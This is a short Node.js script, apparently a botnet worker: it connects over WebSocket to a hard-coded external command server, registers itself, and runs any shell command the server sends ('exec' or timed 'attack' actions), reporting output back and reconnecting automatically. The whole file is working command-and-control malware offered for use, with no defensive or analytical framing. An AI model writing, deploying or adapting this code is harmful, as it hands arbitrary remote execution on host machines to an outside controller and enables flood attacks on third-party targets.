const WebSocket = require('ws');
const { exec } = require('child_process');

// CONFIGURATION
const MASTER_URL = 'ws://node24.lunes.host:3248'; // Ganti dengan URL Manager-mu
const RECONNECT_INTERVAL = 5000;

function connect() {
    console.log(`[WORKER] Connecting to Master: ${MASTER_URL}...`);
    const ws = new WebSocket(MASTER_URL);

    ws.on('open', () => {
        console.log(`[WORKER] Connected! Registering to cluster...`);
        ws.send(JSON.stringify({
            type: 'register'
        }));
    });

    ws.on('message', (data) => {
        try {
            const payload = JSON.parse(data);

            if (payload.action === 'attack' || payload.action === 'exec') {
                console.log(`[TASKS] Received: ${payload.command}`);

                const process = exec(payload.command, (error, stdout, stderr) => {
                    let resultMessage = '';
                    if (error) {
                        resultMessage = `Error: ${error.message}`;
                    } else if (stderr) {
                        resultMessage = `Stderr: ${stderr}`;
                    } else {
                        resultMessage = `Stdout: ${stdout || 'Executed (no output)'}`;
                    }

                    // Send feedback to Master
                    ws.send(JSON.stringify({
                        type: 'log',
                        message: resultMessage.trim()
                    }));
                });

                if (payload.action === 'attack' && payload.duration) {
                    setTimeout(() => {
                        process.kill();
                        console.log(`[CLEANUP] Attack process terminated`);
                    }, payload.duration * 1000 + 2000);
                }
            }
        } catch (e) {
            console.error('[ERROR] Failed to parse message', e);
        }
    });

    ws.on('close', () => {
        console.log(`[WORKER] Connection lost. Retrying in ${RECONNECT_INTERVAL / 1000}s...`);
        setTimeout(connect, RECONNECT_INTERVAL);
    });

    ws.on('error', (err) => {
        console.error(`[ERROR] Socket error: ${err.message}`);
    });
}

connect();
